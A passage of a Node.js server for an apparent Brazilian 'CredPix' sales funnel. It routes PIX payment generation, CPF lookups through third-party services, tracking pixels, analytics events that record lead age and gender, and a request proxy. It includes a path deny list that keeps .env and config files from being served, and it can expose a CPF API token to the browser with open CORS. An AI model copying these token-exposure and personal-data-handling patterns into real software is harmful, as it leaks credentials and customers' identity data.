  const action = url.searchParams.get('action');
  const raw = await readBody(req);
  const body = parseJsonBody(raw);
  const { session, id: sessionId } = ensureSession(req, res);

  if (action === 'product') {
    const productId = url.searchParams.get('product_id') || body.product_id;
    const product = products[productId];
    if (!product) {
      return json(res, 200, { success: false, error: 'Produto nao encontrado' });
    }
    return json(res, 200, {
      success: true,
      product: {
        id: productId,
        name: product.name,
        amount_cents: product.amountCents,
        amount_formatted: 'R$ ' + formatBrl(product.amountCents),
      },
    });
  }

  if (action === 'client') {
    const payer = resolvePayer(session, req, body);
    if (!payer) {
      return json(res, 200, {
        success: false,
        error: 'Informe seu CPF no wizard antes do pagamento.',
      });
    }
    session.payer = payer;
    setSessionCookies(res, sessionId, payer);
    return json(res, 200, {
      success: true,
      client: {
        nome: payer.name || 'Cliente',
        documento: payer.document,
        email: payer.email || 'cliente@email.com',
        telefone: payer.phone || '11999999999',
      },
    });
  }

  if (action === 'generate') {
    const productId = body.product_id || url.searchParams.get('product_id');
    if (!productId) {
      return json(res, 200, {
        success: false,
        error: 'product_id, link_slug ou ab_slug e obrigatorio',
      });
    }

    const useMock = process.env.PAYMENT_MOCK === '1';

    if (!useMock && !gatewayConfigured()) {
      const gwName = activeGateway() === 'anubis' ? 'Anubis' : 'MasterFy';
      return json(res, 200, {
        success: false,
        error: `${gwName} não configurado. Adicione as chaves no arquivo .env e reinicie o servidor.`,
      });
    }

    const payer = resolvePayer(session, req, body);
    if (!payer) {
      return json(res, 200, {
        success: false,
        error: 'Informe seu CPF no wizard antes do pagamento.',
      });
    }
    session.payer = payer;
    const PLACEHOLDER_EMAIL = 'cliente@email.com';
    const PLACEHOLDER_PHONE = '11999999999';
    const resolvedEmail =
      body.email && body.email !== PLACEHOLDER_EMAIL
        ? body.email
        : payer.email && payer.email !== PLACEHOLDER_EMAIL
          ? payer.email
          : PLACEHOLDER_EMAIL;
    const resolvedPhone = (() => {
      const d = String(body.phone || body.telefone || '').replace(/\D/g, '');
      if (d.length >= 10 && d !== PLACEHOLDER_PHONE) return d;
      const p = String(payer.phone || '').replace(/\D/g, '');
      if (p.length >= 10 && p !== PLACEHOLDER_PHONE) return p;
      const ws = body.wizard_session && typeof body.wizard_session === 'object' ? body.wizard_session : {};
      const wPhone = String(ws.telefone || '').replace(/\D/g, '');
      if (wPhone.length >= 10) return wPhone;
      return d.length >= 10 ? d : p.length >= 10 ? p : PLACEHOLDER_PHONE;
    })();
    const payBody = {
      ...body,
      name: payer.name,
      document: payer.document,
      email: resolvedEmail,
      phone: resolvedPhone,
    };

    try {
      const result = useMock
        ? await generatePixMock(productId, payBody, req)
        : activeGateway() === 'anubis'
          ? await generatePixAnubis(req, payBody, session.data)
          : await generatePixMasterfy(req, payBody, session.data);
      const utms = body.utms && typeof body.utms === 'object' ? body.utms : (session.data && session.data.utms) || {};
      const geo  = analytics.clientGeoFromRequest(req);
      const sd   = session.data || {};
      const siteCtx = requestContext.siteContext(req);
      analytics.appendEvent({
        type: 'pix_generated',
        ts: Date.now(),
        session_id: 'pix_' + (result.pix && result.pix.transaction_id),
        browser_session_id: body.analytics_session_id ? String(body.analytics_session_id).slice(0, 64) : null,
        device_hash: body.device_hash ? String(body.device_hash).slice(0, 64) : null,
        base_path: body.base_path ? String(body.base_path).slice(0, 32) : null,
        site_id: siteCtx.site_id,
        site_host: siteCtx.site_host,
        site_origin: siteCtx.site_origin,
        product_id: productId,
        amount_cents: result.pix ? products[productId]?.amountCents : undefined,
        funnel_step: 'checkout',
        traffic_src: utms.src || utms.utm_source || null,
        utm_source: utms.utm_source || null,
        utm_medium: utms.utm_medium || null,
        utm_campaign: utms.utm_campaign || null,
        country: geo.country || null,
        continent: geo.continent || null,
        lead_age: sd.lead_age || sd.idade || null,
        lead_gender: sd.lead_gender || sd.sexo || null,
        meta: {
          transaction_id: result.pix && result.pix.transaction_id,
          gateway: activeGateway(),
        },
      });
      return json(res, 200, result);
    } catch (err) {
      console.error('[MasterFy]', err.message);
      return json(res, 200, {
        success: false,
        error: err.message || 'Erro ao gerar PIX',
      });
    }
  }

  if (action === 'status') {
    const result = await checkPixStatus(body.transaction_id);
    return json(res, 200, result);
  }

  return json(res, 404, { success: false, error: 'Unknown action' });
}

function proxyToRemote(req, res, targetPath) {
  const url = new URL(targetPath, REMOTE);
  const headers = { ...req.headers, host: url.hostname };
  delete headers['content-length'];

  const proxyReq = https.request(
    url,
    { method: req.method, headers },
    (proxyRes) => {
      res.writeHead(proxyRes.statusCode || 502, proxyRes.headers);
      proxyRes.pipe(res);
    }
  );
  req.pipe(proxyReq);
  proxyReq.on('error', () => json(res, 502, { success: false, error: 'Proxy error' }));
}

function serveStatic(req, res, filePath) {
  if (!filePath.startsWith(ROOT)) {
    res.writeHead(403);
    return res.end();
  }
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404);
      return res.end('Not found');
    }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
    res.end(data);
  });
}

function isBlockedPath(pathname) {
  const p = pathname.replace(/\\/g, '/').toLowerCase();
  if (p.includes('/data/') || p.includes('/lib/')) return true;
  if (p.endsWith('.env') || p.includes('/.env')) return true;
  if (p.includes('/config/google-pixels.json')) return true;
  if (p.includes('/config/products')) return true;
  if (p.endsWith('.jsonl')) return true;
  return false;
}

function resolveFile(pathname) {
  if (isBlockedPath(pathname)) {
    return null;
  }
  if (pathname === '/' || pathname === '') {
    return path.join(ROOT, 'index.html');
  }
  if (pathname.endsWith('/')) {
    const indexPath = path.join(ROOT, pathname.slice(1), 'index.html');
    if (fs.existsSync(indexPath)) return indexPath;
  }
  let filePath = path.join(ROOT, pathname.replace(/^\//, ''));
  if (fs.existsSync(filePath) && fs.statSync(filePath).isDirectory()) {
    filePath = path.join(filePath, 'index.html');
  }
  return filePath;
}

function serveCpfTokenConfig(res) {
  const token = getToken();
  const expose =
    clientDirectEnabled() && token && token !== 'SEU_TOKEN_AQUI' && token !== 'SEU_TOKEN_ELAIFLOW';
  res.writeHead(200, {
    'Content-Type': 'application/javascript; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(
    'window.CREDPIX_CPF_DIRECT=' +
      JSON.stringify(!!expose) +
      ';\nwindow.CREDPIX_CPF_TOKEN=' +
      JSON.stringify(expose ? token : '') +
      ';\n'
  );
}

function serveSiteBaseConfig(res, basePath, publicOrigin) {
  const token = getToken();
  const exposeToken =
    clientDirectEnabled() && token && token !== 'SEU_TOKEN_AQUI' && token !== 'SEU_TOKEN_ELAIFLOW';

  res.writeHead(200, {
    'Content-Type': 'application/javascript; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(
    'window.CREDPIX_BASE_PATH=' +
      JSON.stringify(basePath || '') +
      ';\nwindow.CREDPIX_PUBLIC_ORIGIN=' +
      JSON.stringify(publicOrigin || '') +
      ';\nwindow.CREDPIX_CPF_DIRECT=' +
      JSON.stringify(exposeToken) +
      ';\nwindow.CREDPIX_CPF_TOKEN=' +
      JSON.stringify(exposeToken ? token : '') +
      ';\n'
  );
}

function serveAmungCounter(res, slot) {
  const slots = {
    funil:    process.env.AMUNG_FUNIL    || '',
    checkout: process.env.AMUNG_CHECKOUT || '',
    upsell:   process.env.AMUNG_UPSELL   || '',
  };
  const code = slots[slot] || slots.upsell;
  res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(`window.CREDPIX_VIEW_COUNTER_CODE=${JSON.stringify(code)};\n`);
}

function serveJsFile(res, filePath) {
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'application/javascript; charset=utf-8' });
      return res.end(`console.error('CredPix: ${path.basename(filePath)} nao encontrado');\n`);
    }
    res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8', 'Cache-Control': 'no-store' });
    res.end(data);
  });
}

function serveCheckoutHtml(req, res, basePath) {
  const checkoutPath = path.join(ROOT, 'pay', 'checkout.php');
  fs.readFile(checkoutPath, 'utf8', (err, data) => {
    if (err) { res.writeHead(404); return res.end('Not found'); }
    // Remove o bloco PHP do topo: <?php ... ?>
    let html = data.replace(/^<\?php[\s\S]*?\?>\s*\n?/, '');
    // Substitui o echo PHP pelo valor real da env
    const amungCode = process.env.AMUNG_CHECKOUT || '';
    html = html.replace(/<\?=\s*json_encode\(\$amungCheckout[^?]*\)\s*\?>/, JSON.stringify(amungCode));
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    res.end(html);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const rawPathname = decodeURIComponent(url.pathname);
  const basePath = requestContext.detectBasePath(rawPathname);
  const pathname = requestContext.stripBasePath(rawPathname, basePath);
  req.credpixBasePath = basePath;
  req.credpixPublicOrigin = requestContext.resolvePublicOrigin(req);

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-CSRF-Token');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  if (pathname.startsWith('/type/api')) {
    return handleTypeApi(req, res, pathname, basePath);
  }

  if (
    pathname === '/api/consultar-cpf.php' ||
    pathname === '/api/consultar-cpf'
  ) {
    if (req.method !== 'GET') {
      res.writeHead(405);
      return res.end('Method not allowed');
    }
    return handleConsultarCpfRoute(req, res, url);
  }

  if (pathname === '/pay/api/webhook.php' && req.method === 'POST') {
    return handleMasterfyWebhook(req, res);
  }

  if (pathname === '/pay/api/webhook-anubis.php') {
    return handleAnubisWebhook(req, res);
  }

  if (pathname === '/pay/api/pix.php') {
    return handlePixApi(req, res, url);
  }

  if (pathname === '/api/google-pixels.json') {
    return handleGooglePixelsApi(req, res);
  }

  if (pathname === '/api/site-config.php' || pathname === '/api/site-config') {
    return handleSiteConfig(req, res);
  }

  if (
    pathname === '/api/analytics.php' ||
    pathname === '/api/analytics/events' ||
    pathname === '/api/analytics/stats'
  ) {
    return handleAnalyticsApi(req, res, url);
  }

  if (pathname === '/api/health' || pathname === '/api/health.json') {
    return json(res, 200, {
      ok: true,
      node: true,
      basePath: basePath || '/',
      origin: req.credpixPublicOrigin,
      cpf: isElaiflowConfigured(),
      pix: masterfy.isConfigured(),
    });
  }

  if (pathname === '/config/site-base.js' || pathname === '/config/site-base.php') {
    return serveSiteBaseConfig(res, basePath, req.credpixPublicOrigin);
  }

  if (pathname === '/config/cpf-token.js' || pathname === '/api/cpf-token.php') {
    return serveCpfTokenConfig(res);
  }

  if (pathname === '/config/amung-counter.php') {
    const slot = url.searchParams.get('slot') || 'upsell';
    return serveAmungCounter(res, slot);
  }

  if (pathname === '/js/credpix-view-counter.php') {
    return serveJsFile(res, path.join(ROOT, 'js', 'credpix-view-counter.js'));
  }

  if (pathname === '/js/credpix-utm.php') {
    return serveJsFile(res, path.join(ROOT, 'js', 'credpix-utm.js'));
  }

  if (pathname === '/pay/checkout.php') {
    return serveCheckoutHtml(req, res, basePath);
  }

  if (pathname === '/a/type/wizard' || pathname.startsWith('/a/type/wizard/')) {
    const dest = requestContext.withBasePath('/type/wizard/', basePath) + (url.search || '');
    res.writeHead(301, { Location: dest });
    return res.end();
  }

  const file = resolveFile(pathname);
  if (file && fs.existsSync(file) && fs.statSync(file).isFile()) {
    return serveStatic(req, res, file);
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`CredPix funil na porta ${PORT}`);
  console.log('  Domínio e subpasta: detectados automaticamente em cada acesso');
  console.log('  (Host, X-Forwarded-Host, X-Forwarded-Proto)');
  const mfOk = masterfy.isConfigured();
  const payMode =
    process.env.PAYMENT_MOCK === '1' || !mfOk
      ? 'MOCK (demo paga em ~15s)'
      : 'MasterFy PIX real';
  console.log(`  Pagamentos: ${payMode}`);
  if (mfOk) {
    console.log('  Webhook PIX: <seu-dominio>/pay/api/webhook.php (na hora do PIX)');
  }
  const cpfMode = isElaiflowConfigured()
    ? 'Elaiflow (token configurado)'
    : useVeronxFallback()
      ? 'veronx.site (fallback automático)'
      : 'desativado (defina CPF_API_TOKEN ou REMOTE_CPF≠0)';
  console.log(`  CPF: ${cpfMode}`);
  const gp = googlePixels.readConfig();
  console.log(
    `  Google Pixels: ${gp.googleAds.length} conversões, ${gp.ga4.length} GA4 — admin: /admin/pixels-google.html`
  );
  console.log(`  Proxy legado: PROXY_API=1 npm start`);
});
